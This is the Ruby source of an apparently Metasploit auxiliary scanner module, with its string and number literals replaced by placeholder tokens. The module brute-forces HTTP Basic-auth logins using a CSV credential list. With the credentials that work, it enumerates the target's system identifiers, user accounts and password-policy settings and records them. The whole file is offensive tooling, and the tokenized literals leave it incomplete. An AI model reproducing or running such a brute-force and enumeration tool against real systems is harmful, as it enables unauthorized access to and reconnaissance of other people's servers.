require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Auxiliary :: Report include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Scanner def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > [ <str> ] , <str> = > MSF_LICENSE ) register_options ( [ OptString . new ( <str> , [ false , <str> , File . join ( Msf :: Config . install_root , <str> , <str> , <str> ) ] ) , Opt :: RPORT ( <int> ) , ] , self . class ) end def run_host ( ip ) begin res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> } , <int> ) return if not res if ( res . code == <int> ) vprint_status ( <str> ip <str> datastore [ <str> ] <str> res . code <str> ) return elsif ( res . code == <int> || res . code == <int> ) print_status ( <str> ip <str> datastore [ <str> ] <str> res . code <str> ) end list = datastore [ <str> ] users = [ ] fd = CSV . foreach ( list ) do | brute | dbuser = brute [ <int> ] . downcase dbpass = brute [ <int> ] . downcase user_pass = <str> dbuser <str> dbpass <str> res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> Rex :: Text . encode_base64 ( user_pass ) <str> } } , <int> ) if ( not res ) vprint_error ( <str> ip <str> datastore [ <str> ] <str> dbuser <str> dbpass <str> ) next end if ( res . code == <int> ) if ( not res . body . length > <int> ) res . body = res . bufq end sid = res . body . scan ( <str> ) [ <int> ] report_note ( <str> = > ip , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > sid , <str> = > <str> ) print_good ( <str> sid [ <int> ] <str> ip <str> datastore [ <str> ] <str> dbuser <str> dbpass <str> ) users . push ( user_pass ) else vprint_error ( <str> ip <str> datastore [ <str> ] <str> dbuser <str> dbpass <str> ) end end good = false users . each do | user_pass | ( u , p ) = user_pass . split ( <str> ) res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> Rex :: Text . encode_base64 ( user_pass ) <str> } } , - <int> ) if ( res ) if ( res . code == <int> ) if ( not res . body . length > <int> ) res . body = res . bufq end doc = REXML :: Document . new ( res . body ) print_good ( <str> u <str> ) doc . elements . each ( <str> ) do | e | p = e . elements [ <str> ] . get_text v = e . elements [ <str> ] . get_text s = e . elements [ <str> ] . get_text report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> p <str> v <str> , <str> = > <str> ) print_good ( <str> p <str> v <str> s <str> ) end end end res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> Rex :: Text . encode_base64 ( user_pass ) <str> } } , - <int> ) if ( res ) if ( res . code == <int> ) if ( not res . body . length > <int> ) res . body = res . bufq end doc = REXML :: Document . new ( res . body ) doc . elements . each ( <str> ) do | e | next if e . elements [ <str> ] == nil b = e . elements [ <str> ] . get_text report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> b <str> , <str> = > <str> ) print_good ( <str> b <str> ) end end end res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> Rex :: Text . encode_base64 ( user_pass ) <str> } } , - <int> ) if ( res ) if ( res . code == <int> ) if ( not res . body . length > <int> ) res . body = res . bufq end doc = REXML :: Document . new ( res . body ) print_good ( <str> u <str> ) doc . elements . each ( <str> ) do | e | next if ( e . elements [ <str> ] == nil or e . elements [ <str> ] == nil or e . elements [ <str> ] == nil ) h = e . elements [ <str> ] . get_text d = e . elements [ <str> ] . get_text us = e . elements [ <str> ] . get_text sid = h . to_s . scan ( <str> ) [ <int> ] if ( h . to_s . match ( <str> ) ) h = h . to_s . scan ( <str> ) [ <int> ] end if ( sid and sid != <str> ) print_good ( <str> d <str> us <str> h [ <int> ] <str> sid [ <int> ] <str> ) report_note ( <str> = > h [ <int> ] , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > sid , <str> = > <str> ) else print_good ( <str> d <str> us <str> h <str> ) end end end end res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > ( <int> * <int> * <int> ) , <str> = > { <str> = > <str> Rex :: Text . encode_base64 ( user_pass ) <str> } } , - <int> ) if res and res . code == <int> if ( not res . body . length > <int> ) res . body = res . bufq end doc = REXML :: Document . new ( res . body ) print_good ( <str> ip <str> datastore [ <str> ] <str> u <str> ) doc . elements . each ( <str> ) do | user | us = user . elements [ <str> ] . get_text h = user . elements [ <str> ] . get_text as = user . elements [ <str> ] . get_text print_good ( <str> us <str> h <str> as <str> ) good = true if ( as . to_s == <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> u <str> h <str> as <str> , <str> = > <str> ) else report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> u <str> h <str> as <str> , <str> = > <str> ) end end end res = send_request_raw ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > ( <int> * <int> * <int> ) , <str> = > { <str> = > <str> Rex :: Text . encode_base64 ( user_pass ) <str> } } , - <int> ) if res and res . code == <int> if ( not res . body . length > <int> ) res . body = res . bufq end doc = REXML :: Document . new ( res . body ) print_good ( <str> u <str> ) fla = plit = pgt = prt = prm = plot = <str> doc . elements . each ( <str> ) do | e | next if e . elements [ <str> ] == nil case when ( e . elements [ <str> ] . get_text == <str> ) fla = e . elements [ <str> ] . get_text when ( e . elements [ <str> ] . get_text == <str> ) plit = e . elements [ <str> ] . get_text when ( e . elements [ <str> ] . get_text == <str> ) prt = e . elements [ <str> ] . get_text when ( e . elements [ <str> ] . get_text == <str> ) prm = e . elements [ <str> ] . get_text when ( e . elements [ <str> ] . get_text == <str> ) plot = e . elements [ <str> ] . get_text when ( e . elements [ <str> ] . get_text == <str> ) pgt = e . elements [ <str> ] . get_text end end print_good ( <str> fla <str> + <str> plit <str> + <str> prt <str> + <str> prm <str> + <str> plot <str> + <str> pgt <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> prm <str> , <str> = > <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> prt <str> , <str> = > <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> plit <str> , <str> = > <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> fla <str> , <str> = > <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> plot <str> , <str> = > <str> ) report_note ( <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> pgt <str> , <str> = > <str> ) end break if good end rescue :: Rex :: ConnectionRefused , :: Rex :: HostUnreachable , :: Rex :: ConnectionTimeout rescue :: Timeout :: Error , :: Errno :: EPIPE end end end 
